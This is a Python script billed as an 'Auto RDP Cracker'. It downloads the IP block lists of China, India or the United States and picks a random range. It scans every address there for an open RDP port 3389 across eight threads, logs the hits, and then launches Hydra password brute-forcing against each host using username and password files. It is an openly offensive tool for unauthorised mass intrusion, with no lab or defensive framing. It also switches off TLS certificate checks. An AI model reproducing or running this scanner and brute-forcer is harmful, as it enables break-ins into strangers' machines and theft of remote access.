from netaddr import IPNetwork
import urllib.request
import random
import os.path
import socket
import threading
import subprocess
import logging

import ssl

ssl._create_default_https_context = ssl._create_unverified_context

logging.basicConfig(level=logging.INFO)


# Grab ip ranges from server and save it in a text file and make range
def grab_ip_list():
    country_urls = {
        1: ('China', 'https://www.ipdeny.com/ipblocks/data/aggregated/cn-aggregated.zone'),
        2: ('India', 'https://www.ipdeny.com/ipblocks/data/aggregated/in-aggregated.zone'),
        3: ('United States', 'https://www.ipdeny.com/ipblocks/data/aggregated/us-aggregated.zone')
    }

    while True:
        try:
            c = input("Enter Country number:\n 1-China \n 2-India\n 3-United States\n-> ")
            c = int(c)
            if c in country_urls:
                country, url = country_urls[c]
                print(f"Grabbing {country} IP Range")
                urllib.request.urlretrieve(url, "ips.txt")
                print('Done!!!')
                break
            else:
                print("Invalid number, please enter a valid country number.")
        except ValueError:
            print("Please enter a valid integer.")


# Selects a Rnadom range and Make chosen Range a list , and save list into a file named selected_ip_range.txt => if
def work_with_ips():
    try:
        # Check if the file exists and is not empty
        if os.path.getsize("ips.txt") > 0:
            with open("ips.txt", "r") as inp:
                ipranges = [line.strip() for line in inp if line.strip()]

            if ipranges:
                random_range = random.choice(ipranges)
                logging.info('Selected random range is: %s', random_range)

                # It's better to overwrite to ensure a fresh list each time
                with open("selected_ip_range.txt", "w") as out:
                    for ip in IPNetwork(random_range):
                        out.write(f"{ip}\n")
                logging.info("IP list created successfully")
            else:
                logging.warning("The IP ranges file is empty.")
        else:
            logging.warning("The IP ranges file does not exist or is empty.")
    except Exception as e:
        logging.error("An error occurred: %s", e)


# Checks that given ips PORT is OPEN? return as T-F

def is_ips_port_open(ip):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(0.5)
        # print(ip)
        return s.connect_ex((ip, 3389)) == 0


# Make a loop For Get and Use is_ips_port_open --- just check single ip --- gets an ip as an argument
def check_alive_ips(count, ip):
    conn = is_ips_port_open(ip)
    if (conn):
        count += 1
        print("Port is open for :)))))))))))", ip)
        with open("ips_with_open_ports.txt", "a") as inp:
            ip = str(ip)
            inp.write('rdp://')
            inp.write(ip)
            inp.write('\n')
    else:
        print("Port is not open for ", ip)
        print("======================================")
    return count


# opens ip list that has been saved in text and return it as an array
def ips2array():
    f = open('selected_ip_range.txt', 'r')
    lines = f.read().splitlines()
    f.close()
    return lines


# check alive ips . gets an ip array as argument and return alive counts
def check_One_By_One(iparray):
    for ips in iparray:
        count_alive = check_alive_ips(0, ips)
    return count_alive


# makes threads for checking alives and divides ip aaray to thread number parts
def multi_ip(iparray):
    splitlen = len(iparray) // 8
    print('split len is ', splitlen)
    t1 = threading.Thread(target=check_One_By_One, args=(iparray[:splitlen],))
    t1.start()

    t2 = threading.Thread(target=check_One_By_One, args=(iparray[splitlen:2 * splitlen],))
    t2.start()

    t3 = threading.Thread(target=check_One_By_One, args=(iparray[2 * splitlen:3 * splitlen],))
    t3.start()

    t4 = threading.Thread(target=check_One_By_One, args=(iparray[3 * splitlen:4 * splitlen],))
    t4.start()

    t5 = threading.Thread(target=check_One_By_One, args=(iparray[4 * splitlen:5 * splitlen],))
    t5.start()

    t6 = threading.Thread(target=check_One_By_One, args=(iparray[5 * splitlen:6 * splitlen],))
    t6.start()

    t7 = threading.Thread(target=check_One_By_One, args=(iparray[6 * splitlen:7 * splitlen],))
    t7.start()

    t8 = threading.Thread(target=check_One_By_One, args=(iparray[7 * splitlen:8 * splitlen],))
    t8.start()


def brute_force(ip, output_file='cracked.txt', username_file='usernames.txt', password_file='passwords.txt', threads=4):
    try:
        hydra_command = [
            "hydra", "-o", output_file, "-V", "-f", "-t", str(threads),
            "-L", username_file, "-P", password_file, ip
        ]
        logging.info("Starting brute force on IP: %s", ip)
        result = subprocess.run(hydra_command, capture_output=True, text=True, check=True)

        # If you want to print Hydra's output to the console, uncomment the following lines:
        # print(result.stdout)
        # print(result.stderr)

        logging.info("Brute force completed for IP: %s", ip)
    except subprocess.CalledProcessError as e:
        logging.error("Hydra encountered an error: %s", e.stderr)
    except Exception as e:
        logging.exception("An unexpected error occurred: %s", str(e))


# gets ips one by one to brute_force()
def brute_force_check():
    print("Brutefoce time :D")
    ips = open('ips_with_open_ports.txt', "r")
    for ip in ips:
        ip = ip.rstrip()
        brute_force(ip)


# makes ipranges to list with *work_with_ips* ---- makes ips saved to an array ---- uses multi thread function to check alives one by one
def main():
    if os.path.isfile('selected_ip_range.txt'):
        os.remove("selected_ip_range.txt")
    work_with_ips()
    iparray = ips2array()
    multi_ip(iparray)


# grabs ip list --- checks alive ips ---- and if alive ips <10 => search again for ips
print("===========================================================")
print("Auto RDP Cracker BY Nic Omidian")
print("===========================================================")
grab_ip_list()
if os.path.isfile('ips_with_open_ports.txt'):
    alive_num = sum(1 for line in open('ips_with_open_ports.txt'))
else:
    alive_num = 0
print('alive num is', alive_num)
while (alive_num < 10):
    main()

# if alive ips > 10 --- starts brute force
brute_force_check()
